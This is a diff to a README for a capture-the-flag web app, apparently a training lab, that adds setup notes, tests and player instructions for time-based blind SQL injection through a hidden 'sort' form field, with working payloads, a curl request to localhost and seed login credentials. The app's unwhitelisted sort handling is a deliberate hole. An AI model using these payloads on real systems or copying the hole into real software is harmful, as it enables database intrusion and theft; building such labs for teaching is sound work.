@@ -15,6 +15,15 @@ To complete the first stage of the CTF, deploy the web app directly on a Linux V
 ./setup.sh
 ```
 
+What it does:
+
+1. Installs Python + MariaDB packages and `bc` (used by the test script).
+2. Creates a virtualenv in `ctf_app/.venv` and installs Flask + PyMySQL.
+3. Starts MariaDB and creates the `ctf_user` account.
+4. Loads the schema and seed user into `ctf_db`.
+
+If MariaDB is already running, the script is idempotent and will reuse it.
+
 ## Run
 
 ```bash
@@ -31,10 +40,23 @@ Classic SQLi on username/password uses parameterized queries, so inputs like `' 
 
 ## How to solve (player-facing instructions)
 
-1. Go to **Sign in** and watch the `sort` parameter (hidden field in the form).
+1. Go to **Sign in** and inspect the POST parameters. There is a hidden field named `sort`.
 2. Send a request with `sort=created_at, IF(1=1, SLEEP(3), 1)`.
 3. Observe the response delay (~3 seconds) to confirm time-based SQLi.
-4. Use boolean conditions with `IF` + `SLEEP` to infer data (e.g., database name length) as described in time-based SQLi tutorials.
+4. Use boolean conditions with `IF` + `SLEEP` to infer data:
+   - Database length: `sort=created_at, IF(LENGTH(DATABASE())=6, SLEEP(3), 1)`
+   - First character: `sort=created_at, IF(SUBSTRING(DATABASE(),1,1)='c', SLEEP(3), 1)`
+5. Iterate over positions and character sets to exfiltrate values.
+
+Example with `curl`:
+
+```bash
+curl -s -o /dev/null -w "%{time_total}\n" \
+  -X POST http://127.0.0.1:5000/login \
+  -d "username=invalid" \
+  -d "password=invalid" \
+  --data-urlencode "sort=created_at, IF(1=1, SLEEP(3), 1)"
+```
 
 ## Tests (verification)
 
@@ -48,3 +70,11 @@ The tests check:
 
 - Classic SQLi payload on username is rejected and returns quickly.
 - Time-based SQLi payload on the `sort` parameter triggers a noticeable delay.
+- Legitimate sorting values (created_at / username) still return quickly.
+- An invalid `sort` value causes a 500 error (to show lack of whitelisting).
+
+Manual verification (optional):
+
+1. Try login with username `clinician` and password `clinic2024` to confirm success.
+2. Try classic SQLi in username: `' OR 1=1 --` and ensure it **fails**.
+3. Try time-based payload in `sort` and ensure the response is delayed.
